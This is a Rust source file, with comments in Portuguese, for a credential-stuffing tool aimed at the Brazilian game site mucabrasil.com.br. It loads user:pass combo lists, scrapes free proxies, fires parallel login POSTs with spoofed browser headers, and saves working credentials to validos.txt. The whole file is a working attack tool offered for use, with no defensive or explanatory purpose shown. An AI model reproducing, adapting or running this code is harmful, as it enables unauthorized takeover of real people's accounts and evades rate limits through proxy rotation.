
use std::fs;
use std::io::Write;
use std::process::exit;
use std::io;
use std::time::Duration;
use lolcrab::Lolcrab;
use colored::*;
use reqwest::header;
use reqwest::Client;
const FILENAME_SALVE: &str = "validos.txt";

use std::thread;
use std::sync::{Arc, Mutex};


use rayon::prelude::*;
use std::collections::HashSet;

fn main() {

    clear_screen();
    ascii_art();

    let _thread_pool = rayon::ThreadPoolBuilder::new()
        .num_threads(500)
        .build_global()
        .unwrap();
    let hash: HashSet<Login<String>> = open_format();

    let get_proxys: Option<HashSet<String>> = get_proxy();
    if get_proxys.is_none() {
        eprintln!("Preciso de proxys");
        std::process::exit(1);
    }

    let all_proxys: HashSet<String> = get_proxys.unwrap();
    let successful_proxys: Arc<Mutex<HashSet<String>>> = Arc::new(Mutex::new(HashSet::new()));

    // Usando Rayon para processar combinações de login e proxy em paralelo
    hash.par_iter().for_each(|login_| {
        all_proxys.iter().for_each(|proxy| {
            if successful_proxys.lock().unwrap().contains(proxy) {
                return; // Proxy já foi bem-sucedido
            }

            let mut attempts = 0;
            while attempts < 15 {
                match login(login_.clone(), proxy.clone()) {
                    Ok(_) => {
                        //println!();
                        let mut successful_proxys = successful_proxys.lock().unwrap();
                        successful_proxys.insert(proxy.clone());
                        break;
                    }
                    Err(_) => {
                        attempts += 1;
                        if attempts >= 4 {
                            break;
                        }
                    }
                }
            }
        });
    });

    println!("Processamento concluído!");
}


#[derive(Debug, Clone, PartialEq, Eq, Hash)]
struct Login<T: AsRef<str>> {
    user: T,
    password: T,
}

use socks::Socks4Stream;
use reqwest::Proxy;
use std::net::SocketAddr;
fn login(login: Login<String>, proxy: String) -> Result<(), Box<dyn std::error::Error>> {







    let mut headers = header::HeaderMap::new();
    headers.insert("accept", "*/*".parse().unwrap());
    headers.insert(
        "accept-language",
        "pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7".parse().unwrap(),
    );
    headers.insert(
        "content-type",
        "application/x-www-form-urlencoded; charset=UTF-8"
            .parse()
            .unwrap(),
    );
    headers.insert("origin", "https://www.mucabrasil.com.br".parse().unwrap());
    headers.insert("priority", "u=1, i".parse().unwrap());
    headers.insert("referer", "https://www.mucabrasil.com.br/".parse().unwrap());
    headers.insert(
        "sec-ch-ua",
        "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\""
            .parse()
            .unwrap(),
    );
    headers.insert("sec-ch-ua-mobile", "?0".parse().unwrap());
    headers.insert("sec-ch-ua-platform", "\"Linux\"".parse().unwrap());
    headers.insert("sec-fetch-dest", "empty".parse().unwrap());
    headers.insert("sec-fetch-mode", "cors".parse().unwrap());
    headers.insert("sec-fetch-site", "same-origin".parse().unwrap());
    headers.insert("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36".parse().unwrap());
    headers.insert("x-requested-with", "XMLHttpRequest".parse().unwrap());
    
    let client = reqwest::blocking::Client::builder().proxy(reqwest::Proxy::all(proxy)?).timeout(Duration::from_secs(10))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        ?;
    let format_login = format!("username={}&password={}", login.user, login.password);
    let res = client
        .post("https://www.mucabrasil.com.br/?go=login")
        .headers(headers)
        .body(format_login)
        .send()?
        .text()?;



    let login_pass = format!("{}:{}", login.user, login.password);
    
    if res.contains("conexão no servidor foi em") {
        println!("{} -> {}", "GOOD".bright_cyan(), login_pass.bright_green());
        salve_file(login_pass, FILENAME_SALVE);
    } else {
        println!("[{}] -> {}", "BAD".bright_white(), login_pass.bright_red());

        // não logado
    }

    Ok(())
}

fn salve_file(buffer_write: String, filename: &str) {
    let mut file = fs::OpenOptions::new()
        .append(true)
        .write(true)
        .create(true)
        .open(filename)
        .unwrap();

    file.write(format!("{}\n", buffer_write).as_bytes());
}

fn openfile() -> PathBuf {
    use native_dialog::FileDialog;

    if let Ok(Some(filename)) = FileDialog::new()
        .add_filter("Select File login user:pass", &["txt"])
        .show_open_single_file()
    {
        return filename;
    } else {
        let _ = MessageDialog::new()
            .set_title("Error")
            .set_type(MessageType::Error)
            .set_text("Error opening the file")
            .show_alert();
    }
    eprintln!("Preciso que voce selecione um arquivo :) ");
    exit(1);
}
use native_dialog::MessageType;
use native_dialog::MessageDialog;

use std::path::PathBuf;

fn open_format() -> HashSet<Login<String>> {
    let open = openfile();
    let mut hash_login = HashSet::new();

    let file = fs::read_to_string(open);
    if let Ok(file) = file {
        for line in file.lines() {
            let split: Vec<&str> = line.split(":").collect();

            if split.len() == 2 {
                let user = split[0].to_string();
                let pass = split[1].to_string();

                let insert_hashset = Login {
                    user,
                    password: pass,
                };

                hash_login.insert(insert_hashset);
            }
        }
    } else {
        eprintln!("Preciso que vc selecione um arquivo");
        exit(1);
    }


    hash_login
}



use std::process::Command;

fn clear_screen() {
    if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(&["/C", "cls"])
            .status()
            .expect("Falha ao limpar a tela");
    } else {
       
        Command::new("clear")
            .status()
            .expect("Falha ao limpar a tela");
    }
}



fn asci() -> &'static str {
    r#"

    ____            __        __              __    
   / __ \___  _____/ /___  __/ /_  ____ _____/ /___ 
  / /_/ / _ \/ ___/ __/ / / / __ \/ __ `/ __  / __ \
 / ____/  __/ /  / /_/ /_/ / /_/ / /_/ / /_/ / /_/ /
/_/    \___/_/   \__/\__,_/_.___/\__,_/\__,_/\____/ 
                                                                               
                                    ┓      •┓
                            ┏┳┓┓┏┏┏┓┣┓┏┓┏┓┏┓┃
                            ┛┗┗┗┻┗┗┻┗┛┛ ┗┻┛┗┗
Selecione um arquivo                              

    "#
}



pub fn ascii_art() {
    let mut lol = Lolcrab::new(None, None);
    let stdout = io::stdout();
    let mut stdout = stdout.lock();
    lol.colorize_str(&asci(), &mut stdout);
    //lol.colorize_str(&asci(), &mut stdout);
}


fn get_proxy() -> Option<HashSet<String>> {
    let url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&timeout=20000";
    let mut hashset = HashSet::new();

    for attempt in 1..=3 {
        match reqwest::blocking::get(url) {
            Ok(response) => {
                eprintln!("Tentativa {}: Capturando proxies...", attempt);

                if let Ok(text) = response.text() {
                     for line in text.lines() {
                        hashset.insert(line.to_string());
                    }
                }
             
            }
            Err(err) => {
                eprintln!("Tentativa {} falhou: {}", attempt, err);
                std::thread::sleep(Duration::from_secs(2)); // Aguarde antes de tentar novamente
            }
        }
    }

   let len = hashset.len();
   println!("Total de proxy : {}", len);
   if len > 1{
        return Some(hashset);
   }

    None
}


